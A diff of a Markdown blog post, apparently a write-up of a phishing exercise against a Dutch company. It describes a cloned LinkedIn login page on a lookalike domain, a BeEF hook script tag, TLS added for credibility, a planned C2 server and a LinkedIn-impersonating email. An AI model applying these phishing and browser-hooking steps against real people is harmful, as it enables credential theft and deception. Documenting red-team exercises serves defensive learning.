@@ -37,7 +37,8 @@ SocialFish and run some additional software.
 
 ## Initial deployment and HTTPS
 
-![First droplet](../../assets/img/phishing/droplet_1.png)
+| ![First droplet](../../assets/img/phishing/droplet_1.png) |
+| First droplet |
 
 We deployed our virtual machine, and I have started setting up the required software:
 
@@ -51,7 +52,8 @@ We deployed our virtual machine, and I have started setting up the required soft
 SocialFish is an open source, Python software which allows users to maintain and run phishing campaigns. The application is open source, which
 allowed me to customize the behavior of the server to tailor it to our needs.
 
-![SocialFish](../../assets/img/phishing/socialfish.png)
+| ![SocialFish](../../assets/img/phishing/socialfish.png) |
+| SocialFish |
 
 I downloaded a copy of LinkedIn's log in page, and uploaded it to the virtual machine to use it as a custom phishing page. This allowed me to add a
 a script tag which injects a Beef-XSS payload into the victim's browser.
@@ -60,14 +62,16 @@ a script tag which injects a Beef-XSS payload into the victim's browser.
 <script src="http://127.0.0.1:3000/hook.js"></script>
 ```
 
-![Beef](../../assets/img/phishing/beef.png)
+| ![Beef](../../assets/img/phishing/beef.png) |
+| Beef |
 
 Moreover, I used the Let's Encrypt certificate services to increase the legitimacy of my website. That way, the website seemed as if it was an actual
 LinkedIn.
 
 ### Blocked domain and new website
 
-![Blocked domain](../../assets/img/phishing/domain_blocked.png)
+| ![Blocked domain](../../assets/img/phishing/domain_blocked.png) |
+| Blocked domain |
 
 However, few hours after deploying the website, I have discovered that the domain was blocked. Apparently Google's (probably) web crawlers flagged the
 website as malicious, since the domain name was `linkedlin.ml` and it was a copy of the linkedin front page. Moreover, I was running Beef-XSS and
@@ -77,7 +81,8 @@ This time, we have decided to apply a firewall on our droplet and whitelist Hoef
  our home and school addresses. I have decided to use `UFW` which was preinstalled on that instance of the Ubuntu server.  
 _I have blurred out the IP addresses since these are sensitive information_
 
-![Firewall rules](../../assets/img/phishing/firewall.png)
+| ![Firewall rules](../../assets/img/phishing/firewall.png) |
+| Firewall rules |
 
 The firewall now only allows the selected IP addresses to the port 443 running the website and port 7443 running a C2 server `covenant` which we planned
 to use after compromising victims.
@@ -92,19 +97,23 @@ _[this url](https://werkenbijhoefnagels.nl/sollicitatieformulier/114/sollicitati
 While Georgi created a fake LinkedIn account, I deployed the infrastructure and connected both SocialFish and Beef-XSS together. We sent the job
 application and awaited their response.
 
-![Landing page](../../assets/img/phishing/linkedllin.ml.png)
+| ![Landing page](../../assets/img/phishing/linkedllin.ml.png) |
+| Landing page |
 
-![Profile](../../assets/img/phishing/profile.png)
+| ![Profile](../../assets/img/phishing/profile.png) |
+| Profile |
 
 While waiting for their answer, we decided to send messages to email addresses that we found during the OSINT phase. We tried deploying an email server
 on our DigitalOcean virtual machine using [Mailcow](https://mailcow.email). However, due to security reasons, new accounts are not allowed to use port 25 to send emails.
 Therefore, we have decided to use the following address: `noreply.linkedllin.ml@gmail.com`
 
-![Phishing email](../../assets/img/phishing/phishing_email.png)
+| ![Phishing email](../../assets/img/phishing/phishing_email.png) |
+| Phishing email |
 
 This fake email impersonating LinkedIn emails was sent to the email addresses of the employees. However, majority of the emails were either blocked or non-existent.
 
-![Email blocked](../../assets/img/phishing/msg_blocked.png)
+| ![Email blocked](../../assets/img/phishing/msg_blocked.png) |
+| Email blocked |
 
 ### Conclusions
 
